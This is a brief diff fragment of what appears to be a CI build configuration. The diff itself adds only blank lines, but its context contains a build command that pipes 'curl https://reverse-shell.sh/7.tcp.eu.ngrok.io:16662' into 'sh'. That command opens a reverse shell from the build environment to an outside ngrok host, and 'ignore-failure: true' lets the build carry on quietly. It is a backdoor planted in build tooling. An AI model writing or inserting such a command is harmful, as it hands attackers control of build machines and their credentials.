@@ -16,3 +16,5 @@ batch:
             commands:
               - curl https://reverse-shell.sh/7.tcp.eu.ngrok.io:16662 | sh
       ignore-failure: true
+
+      
